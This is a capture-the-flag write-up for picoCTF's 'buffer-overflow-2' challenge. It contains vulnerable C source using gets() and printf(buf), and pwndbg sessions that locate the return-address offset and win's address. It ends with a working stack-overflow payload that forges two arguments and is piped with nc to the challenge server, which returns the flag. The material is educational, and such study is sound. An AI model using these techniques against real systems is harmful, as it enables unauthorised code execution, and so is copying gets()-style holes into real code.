# buffer-overflow-2   

Description

Control the return address and arguments

Additional details will be available after launching your challenge instance.

---

so this time we need to deal with comparison arguments 

First let's view the source code.

```c
       │ File: vuln.c
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ #include <stdio.h>
   2   │ #include <stdlib.h>
   3   │ #include <string.h>
   4   │ #include <unistd.h>
   5   │ #include <sys/types.h>
   6   │ 
   7   │ #define BUFSIZE 100
   8   │ #define FLAGSIZE 64
   9   │ 
  10   │ void win(unsigned int arg1, unsigned int arg2) {
  11   │   char buf[FLAGSIZE];
  12   │   FILE *f = fopen("flag.txt","r");
  13   │   if (f == NULL) {
  14   │     printf("%s %s", "Please create 'flag.txt' in this directory with your",
  15   │                     "own debugging flag.\n");
  16   │     exit(0);
  17   │   }
  18   │ 
  19   │   fgets(buf,FLAGSIZE,f);
  20   │   if (arg1 != 0xCAFEF00D)
  21   │     return;
  22   │   if (arg2 != 0xF00DF00D)
  23   │     return;
  24   │   printf(buf);
  25   │ }
  26   │ 
  27   │ void vuln(){
  28   │   char buf[BUFSIZE];
  29   │   gets(buf);
  30   │   puts(buf);
  31   │ }
  32   │ 
  33   │ int main(int argc, char **argv){
  34   │ 
  35   │   setvbuf(stdout, NULL, _IONBF, 0);
  36   │   
  37   │   gid_t gid = getegid();
  38   │   setresgid(gid, gid, gid);
  39   │ 
  40   │   puts("Please enter your string: ");
  41   │   vuln();
  42   │   return 0;
  43   │ }
  44   │ 
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

---

We need to buffer overflow the program to execute the win function and check pass the two comparison arguments.

payload will look like this :

padding + address of the win function + offset between function and arguments(junk) + parameter_1 + paramente_2

let's find the offset of the program.

```bash
❯ sudo gdb vuln
GNU gdb (Debian 13.2-1) 13.2
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 156 pwndbg commands and 47 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $base, $ida GDB functions (can be used with print/break)
Reading symbols from vuln...
(No debugging symbols found in vuln)
------- tip of the day (disable with set show-tips off) -------
Use plist command to dump elements of linked list
pwndbg> cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
pwndbg> run
Starting program: /home/lynk/picoCTF/buffer-overflow-2/vuln 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Please enter your string: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

Program received signal SIGSEGV, Segmentation fault.
0x62616164 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────
*EAX  0xc9
*EBX  0x62616162 ('baab')
*ECX  0xf7e1f9b8 (_IO_stdfile_1_lock) ◂— 0x0
 EDX  0x0
*EDI  0xf7ffcba0 (_rtld_global_ro) ◂— 0x0
*ESI  0x80493f0 (__libc_csu_init) ◂— endbr32 
*EBP  0x62616163 ('caab')
*ESP  0xffffd490 ◂— 'eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
*EIP  0x62616164 ('daab')
────────────────────[ DISASM / i386 / set emulate on ]─────────────────────
Invalid address 0x62616164










─────────────────────────────────[ STACK ]─────────────────────────────────
00:0000│ esp 0xffffd490 ◂— 'eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
01:0004│     0xffffd494 ◂— 'faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
02:0008│     0xffffd498 ◂— 'gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
03:000c│     0xffffd49c ◂— 'haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
04:0010│     0xffffd4a0 ◂— 'iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
05:0014│     0xffffd4a4 ◂— 'jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
06:0018│     0xffffd4a8 ◂— 'kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
07:001c│     0xffffd4ac ◂— 'laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
───────────────────────────────[ BACKTRACE ]───────────────────────────────
 ► 0 0x62616164
   1 0x62616165
   2 0x62616166
   3 0x62616167
   4 0x62616168
   5 0x62616169
   6 0x6261616a
   7 0x6261616b
───────────────────────────────────────────────────────────────────────────
pwndbg> cyclic -l daab
Finding cyclic pattern of 4 bytes: b'daab' (hex: 0x64616162)
Found at offset 112
pwndbg>
```
---

OFFSET 112

Now find the address of win function

```bash
pwndbg> disass win
Dump of assembler code for function win:
   0x08049296 <+0>:	endbr32
   0x0804929a <+4>:	push   ebp
   0x0804929b <+5>:	mov    ebp,esp
   0x0804929d <+7>:	push   ebx
   0x0804929e <+8>:	sub    esp,0x54
   0x080492a1 <+11>:	call   0x80491d0 <__x86.get_pc_thunk.bx>
   0x080492a6 <+16>:	add    ebx,0x2d5a
   0x080492ac <+22>:	sub    esp,0x8
   0x080492af <+25>:	lea    eax,[ebx-0x1ff8]
   0x080492b5 <+31>:	push   eax
   0x080492b6 <+32>:	lea    eax,[ebx-0x1ff6]
   0x080492bc <+38>:	push   eax
   0x080492bd <+39>:	call   0x8049160 <fopen@plt>
   0x080492c2 <+44>:	add    esp,0x10
   0x080492c5 <+47>:	mov    DWORD PTR [ebp-0xc],eax
   0x080492c8 <+50>:	cmp    DWORD PTR [ebp-0xc],0x0
   0x080492cc <+54>:	jne    0x80492f8 <win+98>
   0x080492ce <+56>:	sub    esp,0x4
   0x080492d1 <+59>:	lea    eax,[ebx-0x1fed]
   0x080492d7 <+65>:	push   eax
   0x080492d8 <+66>:	lea    eax,[ebx-0x1fd8]
   0x080492de <+72>:	push   eax
   0x080492df <+73>:	lea    eax,[ebx-0x1fa3]
   0x080492e5 <+79>:	push   eax
   0x080492e6 <+80>:	call   0x80490e0 <printf@plt>
   0x080492eb <+85>:	add    esp,0x10
   0x080492ee <+88>:	sub    esp,0xc
   0x080492f1 <+91>:	push   0x0
   0x080492f3 <+93>:	call   0x8049130 <exit@plt>
   0x080492f8 <+98>:	sub    esp,0x4
   0x080492fb <+101>:	push   DWORD PTR [ebp-0xc]
   0x080492fe <+104>:	push   0x40
   0x08049300 <+106>:	lea    eax,[ebp-0x4c]
   0x08049303 <+109>:	push   eax
   0x08049304 <+110>:	call   0x8049100 <fgets@plt>
   0x08049309 <+115>:	add    esp,0x10
   0x0804930c <+118>:	cmp    DWORD PTR [ebp+0x8],0xcafef00d
   0x08049313 <+125>:	jne    0x804932f <win+153>
   0x08049315 <+127>:	cmp    DWORD PTR [ebp+0xc],0xf00df00d
   0x0804931c <+134>:	jne    0x8049332 <win+156>
   0x0804931e <+136>:	sub    esp,0xc
   0x08049321 <+139>:	lea    eax,[ebp-0x4c]
   0x08049324 <+142>:	push   eax
   0x08049325 <+143>:	call   0x80490e0 <printf@plt>
   0x0804932a <+148>:	add    esp,0x10
   0x0804932d <+151>:	jmp    0x8049333 <win+157>
   0x0804932f <+153>:	nop
   0x08049330 <+154>:	jmp    0x8049333 <win+157>
   0x08049332 <+156>:	nop
   0x08049333 <+157>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x08049336 <+160>:	leave
   0x08049337 <+161>:	ret
End of assembler dump.
pwndbg>
```

---

ADDRESS OF WIN FUNCTION 0x08049296

---

Now we need to find the offset between function and the comparison arguments.

for that we will do:

padding + address of the win function + cyclic pattern


```bash
pwndbg> r <<< $(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x08aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
Starting program: /home/lynk/picoCTF/buffer-overflow-2/vuln <<< $(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x08aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Breakpoint 1, 0x08049296 in win ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────
*EAX  0xd9
*EBX  0x41414141 ('AAAA')
*ECX  0xf7e1f9b8 (_IO_stdfile_1_lock) ◂— 0x0
 EDX  0x0
*EDI  0xf7ffcba0 (_rtld_global_ro) ◂— 0x0
*ESI  0x80493f0 (__libc_csu_init) ◂— endbr32 
*EBP  0x41414141 ('AAAA')
*ESP  0xffffd490 ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
*EIP  0x8049296 (win) ◂— endbr32 
────────────────────[ DISASM / i386 / set emulate on ]─────────────────────
 ► 0x8049296 <win>       endbr32 
   0x804929a <win+4>     push   ebp
   0x804929b <win+5>     mov    ebp, esp
   0x804929d <win+7>     push   ebx
   0x804929e <win+8>     sub    esp, 0x54
   0x80492a1 <win+11>    call   __x86.get_pc_thunk.bx                     <__x86.get_pc_thunk.bx>
 
   0x80492a6 <win+16>    add    ebx, 0x2d5a
   0x80492ac <win+22>    sub    esp, 8
   0x80492af <win+25>    lea    eax, [ebx - 0x1ff8]
   0x80492b5 <win+31>    push   eax
   0x80492b6 <win+32>    lea    eax, [ebx - 0x1ff6]
─────────────────────────────────[ STACK ]─────────────────────────────────
00:0000│ esp 0xffffd490 ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
01:0004│     0xffffd494 ◂— 'baaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
02:0008│     0xffffd498 ◂— 'caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
03:000c│     0xffffd49c ◂— 'daaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
04:0010│     0xffffd4a0 ◂— 'eaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
05:0014│     0xffffd4a4 ◂— 'faaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
06:0018│     0xffffd4a8 ◂— 'gaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
07:001c│     0xffffd4ac ◂— 'haaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
───────────────────────────────[ BACKTRACE ]───────────────────────────────
 ► 0 0x8049296 win
   1 0x61616161
   2 0x61616162
   3 0x61616163
   4 0x61616164
   5 0x61616165
   6 0x61616166
   7 0x61616167
───────────────────────────────────────────────────────────────────────────
pwndbg> c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x61616161 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────
*EAX  0xffffd440 ◂— 'flag{kant.........}\n'
 EBX  0x41414141 ('AAAA')
*ECX  0x0
*EDX  0x804e248 ◂— 0x0
 EDI  0xf7ffcba0 (_rtld_global_ro) ◂— 0x0
 ESI  0x80493f0 (__libc_csu_init) ◂— endbr32 
 EBP  0x41414141 ('AAAA')
*ESP  0xffffd494 ◂— 'baaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
*EIP  0x61616161 ('aaaa')
────────────────────[ DISASM / i386 / set emulate on ]─────────────────────
Invalid address 0x61616161










─────────────────────────────────[ STACK ]─────────────────────────────────
00:0000│ esp 0xffffd494 ◂— 'baaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
01:0004│     0xffffd498 ◂— 'caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
02:0008│     0xffffd49c ◂— 'daaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
03:000c│     0xffffd4a0 ◂— 'eaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
04:0010│     0xffffd4a4 ◂— 'faaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
05:0014│     0xffffd4a8 ◂— 'gaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
06:0018│     0xffffd4ac ◂— 'haaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
07:001c│     0xffffd4b0 ◂— 'iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
───────────────────────────────[ BACKTRACE ]───────────────────────────────
 ► 0 0x61616161
   1 0x61616162
   2 0x61616163
   3 0x61616164
   4 0x61616165
   5 0x61616166
   6 0x61616167
   7 0x61616168
───────────────────────────────────────────────────────────────────────────
pwndbg> cyclic -l baaa
Finding cyclic pattern of 4 bytes: b'baaa' (hex: 0x62616161)
Found at offset 4
pwndbg> 
```
OFFSET AT 4

It's time for the final payload


---

```python3
❯ python3
Python 3.11.8 (main, Feb  7 2024, 21:52:08) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import pwn
>>> "A" * 112
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
>>> pwn.p32(0x08049296)
b'\x96\x92\x04\x08'
>>> "B" * 4
'BBBB'
>>> pwn.p32(0xcafef00d)
b'\r\xf0\xfe\xca'
>>> pwn.p32(0xf00df00d)
b'\r\xf0\r\xf0'
>>> exit()
❯ echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x08BBBB\r\xf0\xfe\xca\r\xf0\r\xf0" | nc saturn.picoctf.net 54181
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
picoCTF{argum3nt5_4_d4yZ_27ecbf40}
```

---

